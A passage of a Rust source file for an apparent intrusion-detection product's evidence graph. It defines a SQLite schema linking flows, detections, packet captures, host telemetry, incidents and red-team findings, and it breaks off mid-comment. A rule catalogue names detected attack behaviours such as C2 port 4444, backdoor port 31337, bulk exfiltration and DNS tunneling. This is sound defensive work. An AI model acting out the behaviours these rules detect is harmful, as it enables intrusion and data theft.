//! Evidence graph — the track/trace spine (ADR 0009 step 2).
//!
//! V1 flat tables become node stores (`devices`, `flows`, `detections`); one `edges(src,type,dst,ts)`
//! table links them. Every flow/detection/device is a node with a STABLE id, so a detection traces to
//! its flow(s) and device — the drill-down the Mission Control boards need. Same node id everywhere
//! (never a copy). SQLite in-process (edge tier, ADR 0009 rev.) — tiny + standalone; offload to the
//! ClickHouse cloud (`hookprobe_ids`) is JSONEachRow via the mesh gateway. The store sits behind this
//! one struct so it's swappable per-capability if a heavy-analytics tier ever needs DuckDB.
use anyhow::{Context, Result};
use rusqlite::{params, Connection, OptionalExtension};
use std::path::Path;

pub mod host_edr;

pub struct EvidenceGraph {
    conn: Connection,
}

/// Rule id for a Layer-2/3 resource-shed action (AEGIS reflex, `supervisor`'s
/// `--resource-shed-reconcile` one-shot) — mirrors
/// `hookprobe_manifest::scan_responder::RESOURCE_SHED_RULE_ID` exactly (same numbering space,
/// no shared type: this crate has no dependency on `hookprobe-manifest`, the same "hardcoded
/// literal + doc-comment provenance" idiom the 1000040/1000041 NAPSE rule ids already use in
/// this crate's own tests). See [`EvidenceGraph::ingest_response`]'s "resource-shed honesty fix"
/// doc for why this is the ONE rule id `ingest_response` special-cases.
const RESOURCE_SHED_RULE_ID: i64 = 1_000_050;

/// One `ai_explanations` row (ADR 0025) — [`EvidenceGraph::latest_ai_explanation`]'s return shape.
/// A named struct rather than a 5-tuple purely to keep clippy's `type_complexity` lint quiet and
/// the call site in [`EvidenceGraph::incident_detail`] self-documenting (`row.why` reads better
/// than `row.1`).
struct AiExplanationRow {
    model: String,
    why: String,
    confidence: f64,
    reasoning: String,
    ts: f64,
}

/// Result of one `EvidenceGraph::prune` pass (backend-audit gap 1 — `evidence.db` retention).
/// Everything an operator needs to see "the prune is actually working" (`--stats`/the read-API's
/// `graph_stats` surfaces `size_before_bytes`/`size_after_bytes`/the deleted counts via the
/// `meta` watermark this struct is persisted into — see `record_prune_meta`).
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct PruneStats {
    pub ts: f64,
    pub retention_days: f64,
    pub max_db_bytes: Option<i64>,
    /// Raw-table (flow/detection/host/etc.) node rows deleted by age or the size cap.
    pub deleted_nodes: i64,
    /// Edge rows deleted because at least one endpoint was a pruned node.
    pub deleted_edges: i64,
    /// Incidents pruned as a coherent unit (see `sweep_stale_incidents`'s doc comment).
    pub deleted_incidents: i64,
    /// Reports pruned alongside their incident.
    pub deleted_reports: i64,
    pub size_before_bytes: i64,
    pub size_after_bytes: i64,
    pub vacuumed: bool,
}

/// Result of one [`EvidenceGraph::prune_pcap_dir`] pass — the filesystem-tier counterpart to
/// [`PruneStats`] (which only ever touches SQLite rows; a pcap is a real file on disk that
/// `prune`'s table-only sweep knows nothing about).
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct PcapPruneStats {
    pub cap_bytes: i64,
    /// `.pcap` files removed from the directory.
    pub deleted_files: i64,
    pub deleted_bytes: i64,
    /// `pcaps` rows removed alongside their file (0 for an orphan file with no matching row).
    pub deleted_rows: i64,
    pub size_before_bytes: i64,
    pub size_after_bytes: i64,
}

// Lifecycle edge types (ADR 0011 D1 + build step 2) — constants so ingest call sites and any future
// reader (product-steward's roadmap-truth pass, the Ring-2 MCP tools) never hand-type the string.
// Only `supersedes`/`validated_by`/`shipped_in`/`measured_on`/`informed_by` are wired to an ingest
// path in this step; `implements`/`decided_by`/`regressed_by` are reserved for the requirement↔commit
// and adr↔release/benchmark linkage a later Cortex build step adds (ADR 0011 D1 lists all eight).
pub const EDGE_IMPLEMENTS: &str = "implements";
pub const EDGE_DECIDED_BY: &str = "decided_by";
pub const EDGE_VALIDATED_BY: &str = "validated_by";
pub const EDGE_MEASURED_ON: &str = "measured_on";
pub const EDGE_REGRESSED_BY: &str = "regressed_by";
pub const EDGE_SUPERSEDES: &str = "supersedes";
pub const EDGE_SHIPPED_IN: &str = "shipped_in";
pub const EDGE_INFORMED_BY: &str = "informed_by";
// ADR 0013 dev-time lifecycle bus (the Claude Code cortex-emit hooks): every prompt→build interaction.
pub const EDGE_LED_TO: &str = "led_to"; // an intent (a prompt) → the changes/gates it produced
pub const EDGE_IN_SESSION: &str = "in_session"; // a session → each of its lifecycle events
// ADR 0020 D6 (adversarial-resilience harness) — generalizes the ADR 0011 D1 audit-finding shape
// (test_run/benchmark/gate_result as first-class nodes) to adversarial verification specifically.
pub const EDGE_BREACHED: &str = "breached"; // finding → the defense/component it defeated
pub const EDGE_VALIDATES: &str = "validates"; // finding → the adr node it confirms still holds
pub const EDGE_ATTACK_RUN_PRODUCED: &str = "attack_run_produced"; // attack_run → each of its findings
// Trigger-to-evidence pcap capture (roadmap D): a detection → the bounded packet-capture artifact
// `napse-dpi`'s `capture` module wrote for it (see `ingest_detection`'s pcap-linkage block). The
// SAME "constant, never hand-typed at the call site" discipline as the lifecycle edges above.
pub const EDGE_DETECTION_TO_PCAP: &str = "detection_to_pcap";

/// Default `--retention-days` when the operator declares none (backend-audit gap 1 —
/// `evidence.db` retention). Documented, adjustable seed value, never a hidden/hard-coded wall:
/// `hookprobe-evidence-prune.timer` passes this through `HOOKPROBE_RETENTION_DAYS` (see that
/// unit) so an operator can change it without a rebuild.
pub const DEFAULT_RETENTION_DAYS: f64 = 30.0;

/// Trigger-to-evidence pcap capture (roadmap D) directory retention cap — ADR 0003
/// (`docs/adr/0003-platform-manifest-schema.md`'s `retention.tiers` block: `{"name":"pcap",
/// "cap_gb":8, "window":"hours"}`), 8 GiB. This is a COMPLETELY SEPARATE, much larger bound than
/// `napse_loader::capture::DEFAULT_CAPTURE_CAP_MB` (napse-dpi's small in-PROCESS ring ceiling,
/// megabytes, bounding live memory) — this constant governs the ON-DISK DIRECTORY
/// (`/var/lib/hookprobe/pcap/`) that process's FINISHED pcap files accumulate in, swept by
/// `EvidenceGraph::prune_pcap_dir` (`hookprobe-evidence-prune.timer`), never the transient
/// capture buffer. See that function's doc for the eviction policy.
pub const PCAP_DIR_CAP_BYTES: i64 = 8 * 1024 * 1024 * 1024;
/// ADR 0003's pcap-tier retention WINDOW ("hours") — [`EvidenceGraph::prune_pcap_dir`]'s
/// unconditional age-based eviction pass. 24h is a documented, adjustable default (not a
/// fabricated precise reading of "hours" — the ADR names an order of magnitude, not an exact
/// number); an operator can tighten or loosen it without a rebuild (see
/// `crates/hookprobe-evidence/src/main.rs`'s `--pcap-max-age-hours`/`HOOKPROBE_PCAP_MAX_AGE_HOURS`).
pub const DEFAULT_PCAP_MAX_AGE_SECS: f64 = 24.0 * 3600.0;

/// Stable node id: `prefix:<16-hex hash of the natural key>` — deterministic, so re-ingest is idempotent
/// and the same entity gets the same node everywhere.
/// Wall-clock epoch seconds — used ONLY where a source stream carries no timestamp of its own
/// (dnsxai/aegis-guard/qsecbit's line-oriented JSON has no `ts` field; see each module's own
/// `main.rs` doc comment). Every id these ingest paths mint is deterministic over the READING's
/// content instead, precisely so a re-ingest of the same historical line (this crate re-reads the
/// whole retention-capped stream every timer pass) stays idempotent despite the display `ts` being
/// wall-clock-at-ingest, not wall-clock-at-production.
fn now_ts() -> f64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs_f64())
        .unwrap_or(0.0)
}

fn sid(prefix: &str, key: &str) -> String {
    // FNV-1a 64-bit — a FIXED algorithm, so persisted node ids survive a Rust-toolchain rebuild
    // (std DefaultHasher is explicitly NOT stable across releases → would silently break idempotency
    // of a persistent --db across a version bump). Deterministic → same entity, same id everywhere.
    let mut h: u64 = 0xcbf29ce484222325;
    for b in key.as_bytes() {
        h ^= *b as u64;
        h = h.wrapping_mul(0x0000_0100_0000_01b3);
    }
    format!("{prefix}:{h:016x}")
}

const SCHEMA: &str = r#"
CREATE TABLE IF NOT EXISTS devices (
  id TEXT PRIMARY KEY, ip TEXT, mac TEXT, first_seen DOUBLE, last_seen DOUBLE
);
CREATE TABLE IF NOT EXISTS flows (
  id TEXT PRIMARY KEY, ts DOUBLE, src_ip TEXT, src_port INTEGER, dst_ip TEXT, dst_port INTEGER,
  proto TEXT, conn_state TEXT, orig_bytes BIGINT, resp_bytes BIGINT
);
CREATE TABLE IF NOT EXISTS detections (
  id TEXT PRIMARY KEY, ts DOUBLE, rule_id BIGINT, rule_msg TEXT, category TEXT, severity INTEGER,
  mitre TEXT, src_ip TEXT, dst_ip TEXT, dst_port INTEGER, confidence DOUBLE
);
-- heqk (CM5 microkernel sensor) export provenance, keyed by detection id (a side table so the
-- positional 11-column `detections` inserts every producer uses are untouched): which sensor +
-- tenant reported it, its per-boot sequence, and the tri-state verdict class behind PASS/DROP.
CREATE TABLE IF NOT EXISTS heqk_detection_meta (
  det_id TEXT PRIMARY KEY, sensor_fp TEXT, tenant TEXT, boots INTEGER, ev_seq INTEGER,
  verdict TEXT, class TEXT, sev_points INTEGER, src_mac_hash TEXT
);
-- Per-sensor-boot LOSS accounting from the export stream (bounded & honest retention: what did
-- NOT arrive is evidence too): receiver-detected gaps/late frames + the sensor's own drops.
CREATE TABLE IF NOT EXISTS heqk_sensor_loss (
  sensor_fp TEXT, boots INTEGER, tenant TEXT, last_ts DOUBLE, frames INTEGER,
  gap_events INTEGER, late_events INTEGER, device_lost INTEGER, device_overruns INTEGER,
  qsecbit INTEGER, PRIMARY KEY (sensor_fp, boots)
);
-- Trigger-to-evidence pcap capture (roadmap D): the bounded packet-capture artifact
-- `napse-dpi`'s `capture` module wrote for a detection (pre-trigger ring + bounded post-trigger
-- tail — see that module's doc). `id` = `sid("pcap", path)` (the SAME `prefix:hash` convention
-- every other node type in this graph uses), never a hand-typed literal, so it never needs to be
-- kept in sync with anything `napse-dpi` itself computes (see `ingest_detection`'s pcap-linkage
-- block for why no cross-crate id-matching scheme was needed). `first_ts`/`last_ts` are the
-- earliest/latest FRAME timestamp actually captured into the file (may be EARLIER than the
-- detection's own `ts` — the pre-trigger ring captures history BEFORE the trigger fired).
CREATE TABLE IF NOT EXISTS pcaps (
  id TEXT PRIMARY KEY, ts DOUBLE, path TEXT, sha256 TEXT, bytes BIGINT, src_ip TEXT,
  first_ts DOUBLE, last_ts DOUBLE
);
-- Host-layer node types (populated when Senzorium's eBPF host telemetry lands — the process→file→
-- registry→credential half of the threat graph in docs/MissionControl.md). Network layer is above.
CREATE TABLE IF NOT EXISTS processes (
  id TEXT PRIMARY KEY, ts DOUBLE, device_ip TEXT, pid INTEGER, name TEXT, cmdline TEXT, parent_pid INTEGER
);
-- `sha256` (2026-07-09, ADR 0027 follow-up): the file-content hash a host-telemetry producer
-- computed on a WRITE (fanotify's `hookprobe-fanotify`, capped-size — see that binary's doc for
-- why an oversized file is left ""), empty string when not computed/not a write. This is what
-- makes `hookprobe_hydra::matcher::match_hash` a LIVE path instead of type-complete-but-dead code
-- (see that function's own doc comment) — a malware-hash IOC in the bundled feed can now actually
-- fire against a real file drop. Additive column; see `open()`'s migration note for pre-existing
-- `evidence.db` files created before this column existed.
CREATE TABLE IF NOT EXISTS files (
  id TEXT PRIMARY KEY, ts DOUBLE, device_ip TEXT, path TEXT, action TEXT, sha256 TEXT DEFAULT ''
);
CREATE TABLE IF NOT EXISTS registry_keys (
  id TEXT PRIMARY KEY, ts DOUBLE, device_ip TEXT, key TEXT, action TEXT
);
CREATE TABLE IF NOT EXISTS credentials (
  id TEXT PRIMARY KEY, ts DOUBLE, device_ip TEXT, principal TEXT, kind TEXT
);
-- Correlation layer: incidents group detections into one traceable story; intel nodes enrich them.
CREATE TABLE IF NOT EXISTS incidents (
  id TEXT PRIMARY KEY, ts DOUBLE, title TEXT, device_ip TEXT, priority TEXT, status TEXT, threat_score DOUBLE
);
CREATE TABLE IF NOT EXISTS iocs (
  id TEXT PRIMARY KEY, ts DOUBLE, indicator TEXT, ioc_type TEXT, family TEXT, hits INTEGER
);
-- Exploitability layer (ADR 0024): the SBOM→CVE→EPSS→VEX→SSVC pipeline's output as first-class
-- evidence-graph nodes, so Intelligence/Investigate render REAL data instead of ui/src/store/
-- itlMock.ts. `vulns` = a CVE matched against a shipped component (the OSV+EPSS join). `vex_findings`
-- = the per-CVE VEX status + SSVC decision (the assessment). One `vulnerable_in` edge links the
-- CVE node to `dev:self` (this device), one `assessed_as` edge links the assessment to its CVE —
-- so an operator's device subgraph now includes "what am I known-exploitable-and-reachable to".
CREATE TABLE IF NOT EXISTS vulns (
  id TEXT PRIMARY KEY, ts DOUBLE, cve TEXT, component TEXT, component_version TEXT,
  summary TEXT, cvss DOUBLE, epss DOUBLE, kev INTEGER, published TEXT
);
CREATE TABLE IF NOT EXISTS vex_findings (
  id TEXT PRIMARY KEY, ts DOUBLE, cve TEXT, component TEXT, status TEXT, justification TEXT,
  ssvc TEXT, exploitation TEXT, exposed INTEGER, epss DOUBLE, reason TEXT, fixed_version TEXT,
  impact_statement TEXT
);
-- AEGIS reflex response events (e.g. the scan-responder's ENRICH/DROP/DOCUMENT cycle): what we
-- DID about a detection ("quarantined via nft, TTL 300s auto-revert" / "released — TTL expired"
-- / "NOT quarantined — allowlisted"). Linked to the detection(s) it responded to by the
-- `responded_with` edge (see `ingest_response`) — the "what we did" leg of track & trace,
-- alongside "who they are" (host-intel JSON, outside this graph) and "what they did" (detections).
CREATE TABLE IF NOT EXISTS responses (
  id TEXT PRIMARY KEY, ts DOUBLE, action TEXT, target TEXT, mechanism TEXT, detail TEXT,
  ttl_secs INTEGER, status TEXT
);
-- Lifecycle layer (ADR 0011 D1 build step 2): the Product Cortex is a LENS on this same graph, not a
-- second store — roadmap (adrs/requirements), delivery (commits/releases/gate_results), and field
-- signal (beacons) become nodes an operator's incident already lives next to. Timestamps here are
-- ISO-8601 TEXT (not epoch DOUBLE like the packet-timeline tables above): every source contract
-- (ADR front-matter, release.json, beacon.json) is already an ISO-8601 string and this crate has no
-- date-math dependency to justify a lossy/added conversion — store what the contract gives us.
CREATE TABLE IF NOT EXISTS adrs (
  id TEXT PRIMARY KEY, number INTEGER, title TEXT, status TEXT, path TEXT
);
CREATE TABLE IF NOT EXISTS requirements (
  id TEXT PRIMARY KEY, slug TEXT, title TEXT, source TEXT
);
CREATE TABLE IF NOT EXISTS commits (
  id TEXT PRIMARY KEY, subject TEXT
);
CREATE TABLE IF NOT EXISTS releases (
  id TEXT PRIMARY KEY, version TEXT, channel TEXT, digest_summary TEXT, ts TEXT
);
CREATE TABLE IF NOT EXISTS gate_results (
  id TEXT PRIMARY KEY, stage TEXT, verdict TEXT, detail TEXT, release_version TEXT, ts TEXT
);
-- Opt-in product-health beacon (ADR 0012 D5) — lifecycle signal ONLY (release/boot/health/QSecBit
-- aggregate), never security telemetry or customer data; matched to its release by image_version.
CREATE TABLE IF NOT EXISTS beacons (
  id TEXT PRIMARY KEY, beacon_id TEXT, image_version TEXT, device_class TEXT, profile TEXT,
  boot_healthy INTEGER, boot_unhealthy INTEGER, rollbacks INTEGER,
  healed INTEGER, failed INTEGER, shed INTEGER, reverted INTEGER,
  qsecbit_avg DOUBLE, ts TEXT
);
-- ADR 0013 dev-time lifecycle bus: one Claude Code session, and each prompt→build event under it.
-- Fed automatically by the cortex-emit hooks (UserPromptSubmit/PostToolUse/Stop) — no reliance on
-- the AI remembering to log; the harness emits, the graph ingests. C9: records, never enforces.
CREATE TABLE IF NOT EXISTS sessions (
  id TEXT PRIMARY KEY, session_key TEXT, first_ts TEXT, last_ts TEXT, intent TEXT
);
CREATE TABLE IF NOT EXISTS lifecycle_events (
  id TEXT PRIMARY KEY, session TEXT, kind TEXT, ts TEXT, summary TEXT, detail TEXT
);
-- QSECBIT composite-resilience readings (F-B6): the Mission Control "Organism Status" orb's
-- backing node. QSECBIT scores THIS host, not a LAN device learned from flows, so it is its own
-- node type (a `qsecbit_score_of` edge to the synthetic `dev:self` node) rather than bolted-on
-- columns on `devices` — see `ingest_qsecbit_score` for the full rationale.
CREATE TABLE IF NOT EXISTS qsecbit_scores (
  id TEXT PRIMARY KEY, ts DOUBLE, score DOUBLE, band TEXT, drift DOUBLE, qdrift DOUBLE,
  p_attack DOUBLE, decay DOUBLE, maha_dist DOUBLE, entropy_nats DOUBLE
);
-- Adversarial-resilience harness (ADR 0020 D6) — a LENS on this same graph, not a second store.
-- `attack_runs`: one campaign, written BEFORE its first probe fires (the pre-fire audit, D3
-- contract #5) and overwritten in place with its final verdict once every probe has run.
-- `dut_targets` is a ';'-joined list (same pragmatic rollup style `releases.digest_summary` uses),
-- not a normalized table — the full per-target detail lives in the campaign's own JSON files
-- (security/redteam/<out>/), which this crate does not need to own.
CREATE TABLE IF NOT EXISTS attack_runs (
  id TEXT PRIMARY KEY, ts TEXT, roe_hash TEXT, cadence TEXT, image_version TEXT,
  dut_targets TEXT, operator TEXT, verdict TEXT
);
-- `findings`: one probe outcome. `verified_fired` is the loop-closing bit (D6): 0 means the DUT's
-- own defense-fired telemetry could not be read, so `outcome` MUST be 'inconclusive' regardless of
-- what the campaign claimed (`redteam_engine::findings::Finding::new` already enforces this in the
-- engine; this ingest path re-derives it defensively too — never trust the claim, verify the bit).
CREATE TABLE IF NOT EXISTS findings (
  id TEXT PRIMARY KEY, ts TEXT, attack_run TEXT, layer TEXT, probe TEXT, target_component TEXT,
  outcome TEXT, severity TEXT, verified_fired INTEGER, evidence_ref TEXT, mitre_attck TEXT,
  repro_seed INTEGER
);
-- Tiny key/value watermark store (F-B5 auto-correlation): `correlate_all` persists how far it has
-- already scanned the `detections` table so a timer-driven re-run only correlates NEW activity —
-- one row today (`correlate_watermark`), general-purpose so future timer passes can add their own.
CREATE TABLE IF NOT EXISTS meta (
  key TEXT PRIMARY KEY, value TEXT
);
-- ---- Track/trace chain closure (MissionControl.md's Device→Interface→…→Report chain) ----------
-- `interfaces`: the LAN/WAN ROLE a flow's source crossed (`ingest_flow`, via the SAME canonical
-- `hookprobe_mgmt_guard::classify_source` predicate the scan-responder/aegis-guard enforcement
-- paths already share). Only ever 2-3 rows exist (`iface:lan`/`iface:wan` — see `ingest_flow`'s
-- doc comment for why there is no per-NIC `iface:end0`/`iface:wlan0` node: no upstream producer
-- emits a literal interface name today, and fabricating one would violate the "never invented"
-- discipline this whole ingest layer holds to).
CREATE TABLE IF NOT EXISTS interfaces (
  id TEXT PRIMARY KEY, role TEXT, label TEXT
);
-- `applications`: the destination service a flow was headed to — HTTP Host / TLS SNI / declared
-- `service`+dst_port / bare dst_port, in that preference order (see `ingest_flow`). `first_seen`/
-- `last_seen` widen on every flow that resolves to the same application key.
-- `ja4`/`ja4s`/`ja4h` (2026-07-09, detection-surface expansion): the modern FoxIO JA4+ suite,
-- computed by `napse_loader::dpi` alongside the legacy `ja3` above — `ja4` rides the SAME
-- ClientHello record `ja3`/`sni` do, `ja4h` the SAME HTTP-request record `http_host` does; `ja4s`
-- (the TLS ServerHello fingerprint) has no per-packet peer to ride with and lands on its OWN
-- record — see `dpi::parse_tls_server_hello`'s doc comment for the honest scope note on why a
-- SNI-keyed connection's `ja4s` may land in a different `applications` bucket than its `ja3`/`ja4`
-- when this crate has no cross-packet flow-state tracker to merge them (out of scope for this
-- pure-parser addition). Additive columns; see `open()`'s migration note.
CREATE TABLE IF NOT EXISTS applications (
  id TEXT PRIMARY KEY, service TEXT, dst_port INTEGER, sni TEXT, http_host TEXT, ja3 TEXT,
  first_seen DOUBLE, last_seen DOUBLE, ja4 TEXT DEFAULT '', ja4s TEXT DEFAULT '', ja4h TEXT DEFAULT ''
);
-- `users`: an OS-level principal — from host-telemetry `credentials` (real, device-attributed) or
-- the single canonical `user:unknown` node (WAN-origin network detections — see
-- `attribute_network_detection_user`'s doc comment for why "unknown" is itself the honest,
-- non-fabricated answer there, never a stand-in for "not yet correlated").
CREATE TABLE IF NOT EXISTS users (
  id TEXT PRIMARY KEY, principal TEXT, first_seen DOUBLE, last_seen DOUBLE
);
-- `net_sessions`: flows between the same (src_ip,dst_ip) pair folded into one logical session
-- within a 30-minute bucket (`ingest_flow`). UNRELATED to the ADR 0013 dev-time lifecycle
-- `sessions` table (a Claude Code prompt session) — deliberately its own table + `netsess:` id
-- prefix so the two node kinds can never be confused in a query or a drill-down.
CREATE TABLE IF NOT EXISTS net_sessions (
  id TEXT PRIMARY KEY, src_ip TEXT, dst_ip TEXT, first_ts DOUBLE, last_ts DOUBLE
);
-- `reports`: the executive-facing terminus of the evidence chain (`generate_report`) — one row
-- per incident (re-generating overwrites it in place), `body_json` carrying the full assembled
-- document (summary/timeline/MITRE techniques/evidence node ids/confidence/response taken) so a
-- report can drill BACK into every raw node it cites via `report_cites_evidence` edges.
CREATE TABLE IF NOT EXISTS reports (
  id TEXT PRIMARY KEY, ts DOUBLE, incident_id TEXT, title TEXT, summary TEXT, body_json TEXT
);
CREATE INDEX IF NOT EXISTS idx_reports_incident ON reports(incident_id);
-- ADR 0025 (AEGIS BYO-LLM planner): the ONLY table `hookprobe-planner` ever writes to. One row per
-- explanation run over an EXISTING incident (never creates one) — `crates/hookprobe-planner`'s
-- assistive-only, never-enforcement write path. `incident_detail` reads the LATEST row per
-- incident_id (ORDER BY ts DESC LIMIT 1); zero rows for an incident is the honest, un-fabricated
-- default (`model: null` in the API response), exactly as it was before this table existed.
CREATE TABLE IF NOT EXISTS ai_explanations (
  id TEXT PRIMARY KEY, incident_id TEXT, ts DOUBLE, model TEXT, why TEXT, confidence DOUBLE, reasoning TEXT
);
CREATE INDEX IF NOT EXISTS idx_ai_explanations_incident ON ai_explanations(incident_id, ts);
-- One typed-edge table links EVERY node (network + host + correlation) — the attack-path spine.
-- PK dedups edges so re-ingest is idempotent (else count(*)-based traces double on replay).
CREATE TABLE IF NOT EXISTS edges (
  src_id TEXT, edge_type TEXT, dst_id TEXT, ts DOUBLE,
  PRIMARY KEY (src_id, edge_type, dst_id)
);
-- Index the detection→flow match (else linkage is O(detections × flows) full scans).
CREATE INDEX IF NOT EXISTS idx_flows_match ON flows(src_ip, dst_ip, dst_port);
-- Index BOTH edge endpoints so attack_path's bidirectional traversal (src=x OR dst=x) is index-driven
-- each way: the PK already covers src_id (leftmost column); dst_id needs its own index. Without this a
-- dense hub is a 10s full-scan recursion; with it, milliseconds.
CREATE INDEX IF NOT EXISTS idx_edges_dst ON edges(dst_id);
-- Index the beacon→release match (version lookup) — else every beacon ingest is a full releases scan.
CREATE INDEX IF NOT EXISTS idx_releases_version ON releases(version);
"#;

/// The recursive-CTE subgraph reachable from a seed node id (`?1`), BOTH edge directions (a CASE
/// picks the other endpoint each step), capped at depth 6 — the shared traversal `attack_path`,
/// `incident_timeline`, and `incident_process_tree` all build on, factored out ONCE so the three
/// never risk drifting on what "the incident's subgraph" means. `rs` collapses to the MIN depth
/// per node (a node reachable by more than one path keeps its closest distance to the seed).
const REACH_CTE: &str = "WITH RECURSIVE reach(node_id, depth) AS (
    SELECT CAST(?1 AS TEXT), 0
    UNION
    SELECT CASE WHEN e.src_id=r.node_id THEN e.dst_id ELSE e.src_id END, r.depth+1
    FROM reach r JOIN edges e ON (e.src_id=r.node_id OR e.dst_id=r.node_id)
    WHERE r.depth < 6
  ), rs AS (SELECT node_id, min(depth) AS depth FROM reach GROUP BY node_id)";

/// Additive, nullable column migration for a pre-existing `evidence.db` created BEFORE the
/// `files.sha256` / `applications.ja4`/`ja4s`/`ja4h` columns existed (2026-07-09). `CREATE TABLE IF
/// NOT EXISTS` above is a no-op on an already-created table, so a device that flashed an OLDER
/// image needs these columns added explicitly on next start — the SAME "columns, not a second
/// store" discipline `ingest_qsecbit_score`'s own doc comment already argues FOR when a genuinely
/// NEW node type is a better fit than a bolted-on column (this is the opposite, honest case: a
/// column that clearly belongs on an EXISTING node type). Every `ALTER TABLE … ADD COLUMN` here is
/// nullable/defaulted (`DEFAULT ''`) and additive — zero data loss, and `"duplicate column name"`
/// (the expected outcome on a DB the `CREATE TABLE` above already created fresh, with the column
/// baked in) is the ONLY error silently swallowed; any OTHER sqlite error still surfaces.
fn migrate_additive_columns(conn: &Connection) -> Result<()> {
    for stmt in [
        "ALTER TABLE files ADD COLUMN sha256 TEXT DEFAULT ''",
        "ALTER TABLE applications ADD COLUMN ja4 TEXT DEFAULT ''",
        "ALTER TABLE applications ADD COLUMN ja4s TEXT DEFAULT ''",
        "ALTER TABLE applications ADD COLUMN ja4h TEXT DEFAULT ''",
    ] {
        if let Err(e) = conn.execute(stmt, []) {
            if !e.to_string().contains("duplicate column name") {
                return Err(e).with_context(|| format!("running migration: {stmt}"));
            }
        }
    }
    Ok(())
}

/// heqk (CM5 microkernel sensor) rule-id band: `HEQK_RULE_BAND + kernel rule id`. Fresh range —
/// napse 1_000_0xx, l2guard 1_000_03x, host-EDR 1_000_1xx, HYDRA 4_000_000_001, supply-chain 9_xxx.
pub const HEQK_RULE_BAND: i64 = 1_200_000;

/// The heqk kernel rule catalogue (`kernel/heqk/kernel/src/rules.rs`) → (message, category,
/// MITRE, canonical severity). Unknown ids still ingest (never dropped), as a generic MEDIUM.
fn heqk_rule(id: i64) -> (String, &'static str, &'static str, i64) {
    let (m, c, t, s): (&str, &str, &str, i64) = match id {
        1 => ("Known C2 port 4444", "signature", "T1571", SEV_HIGH),
        2 => ("Telnet (23) access", "signature", "T1021", SEV_MEDIUM),
        3 => ("Backdoor port 31337", "signature", "T1571", SEV_HIGH),
        101 => ("Malformed ARP", "malformed_frame", "", SEV_LOW),
        102 => ("ARP spoofing", "arp_spoof", "T1557.002", SEV_HIGH),
        110 => ("L2 structural anomaly", "malformed_frame", "", SEV_LOW),
        111 => ("MAC flood", "mac_flood", "T1498", SEV_MEDIUM),
        112 => ("Broadcast storm", "bcast_storm", "T1498", SEV_MEDIUM),
        113 => ("Port scan", "port_scan", "T1046", SEV_MEDIUM),
        114 => ("New-connection rate shed", "resource_shed", "T1499", SEV_MEDIUM),
        115 => ("Resource-exhaustion shed", "resource_shed", "T1499", SEV_MEDIUM),
        116 => ("Beaconing", "beaconing", "T1071", SEV_MEDIUM),
        117 => ("Lateral movement", "lateral_movement", "T1021", SEV_HIGH),
        118 => ("Bulk exfiltration", "exfiltration", "T1048", SEV_HIGH),
        119 => ("DNS tunneling / DGA", "dns_dga", "T1071.004", SEV_MEDIUM),
        120 => ("Truncated / unparseable frame", "malformed_frame", "", SEV_LOW),
        121 => ("Rogue IPv6 router advertisement", "rogue_ra", "T1557", SEV_HIGH),
        122 => ("IPv6 RA flood", "ra_flood", "T1498", SEV_MEDIUM),
        123 => ("Unparseable IPv6 (evasion attempt)", "evasion", "", SEV_LOW),
        201 => ("TCP NULL scan", "port_scan", "T1046", SEV_MEDIUM),
        202 => ("TCP FIN scan", "port_scan", "T1046", SEV_MEDIUM),
        203 => ("TCP Xmas scan", "port_scan", "T1046", SEV_MEDIUM),
        204 => ("TCP SYN-FIN scan", "port_scan", "T1046", SEV_MEDIUM),
        301 => ("SYN flood", "syn_flood", "T1498.001", SEV_HIGH),
        302 => ("Blocklisted IP", "ioc_match", "", SEV_HIGH),
        _ => return (format!("heqk rule {id}"), "heqk", "", SEV_MEDIUM),
    };
    (m.to_string(), c, t, s)
}

/// Canonical detection severity — 1=CRITICAL … 5=INFO (Suricata), the scale napse, host-EDR and
/// the UI's `severityLabel` already use. Every producer writing `detections.severity` must use it.
const SEV_HIGH: i64 = 2;
const SEV_MEDIUM: i64 = 3;
const SEV_LOW: i64 = 4;

/// One-shot VALUE migration (gated on `PRAGMA user_version`). v1: the dns_dga / aegis_reflex /
/// aegis_guard producers used to write a HIGHER-is-worse scale (dns suspicious=1, malicious=2;
/// reflex JITTER=1, SHADOW=2, DISCONNECT=3; guard RequireApproval=1, Deny=2) into the same column
/// as the canonical 1=CRITICAL scale — so the UI labelled a merely *suspicious* lookup CRITICAL
/// and incident priority mixed both. Remap those rows once to the canonical scale.
fn migrate_values(conn: &Connection) -> Result<()> {
    let v: i64 = conn.query_row("PRAGMA user_version", [], |r| r.get(0))?;
    if v < 1 {
        conn.execute_batch(
            "BEGIN;
             UPDATE detections SET severity = CASE severity WHEN 2 THEN 2 WHEN 1 THEN 3 ELSE severity END
               WHERE category = 'dns_dga';
             UPDATE detections SET severity = CASE severity WHEN 3 THEN 2 WHEN 2 THEN 3 WHEN 1 THEN 4 ELSE severity END
               WHERE category = 'aegis_reflex';
             UPDATE detections SET severity = CASE severity WHEN 2 THEN 3 WHEN 1 THEN 4 ELSE severity END
               WHERE category = 'aegis_guard';
             PRAGMA user_version = 1;
             COMMIT;",
        )
        .context("severity-scale value migration v1")?;
    }
    Ok(())
}

impl EvidenceGraph {
    pub fn open(path: &Path) -> Result<Self> {
        let conn = Connection::open(path).context("open sqlite")?;
        // 2026-07-07 HIGH-1 fix (found on-metal): the reader (`open_readonly`, the hookprobe-api
        // dashboard surface) runs under `ReadOnlyPaths=/var/lib/hookprobe`. A WAL database CANNOT be
        // opened by ANY connection — even a read-only one — without creating/writing the `-wal`/`-shm`
        // sidecars (WAL uses shared memory to register readers), so on the read-only bind every
        // `/api/detections|incidents|flows|…` request failed `SQLITE_CANTOPEN` ("unable to open
        // database file") while the DB itself was fully populated — the entire dashboard read path was
        // dead. TRUNCATE (rollback) journaling needs no sidecars, so a read-only reader opens cleanly
        // on a read-only mount. The per-INSERT-fsync cost WAL used to avoid is ALREADY avoided by the
        // ingest wrapping every batch in ONE explicit transaction (see `begin()`), so with
        // synchronous=NORMAL this is one journal write + one fsync per 2-minute batch — no SD-card
        // regression. (TRUNCATE over DELETE: truncates the journal to 0 bytes instead of unlinking it,
        // one fewer metadata op per commit on the SD card.)
        // `busy_timeout` (ADR 0025): `hookprobe-planner`'s `record_ai_explanation` is a SECOND
        // writer of this same file (the `hookprobe-evidence.timer` ingest loop is the first,
        // pre-existing one) — rare, operator-triggered, but real. Without a busy timeout, one
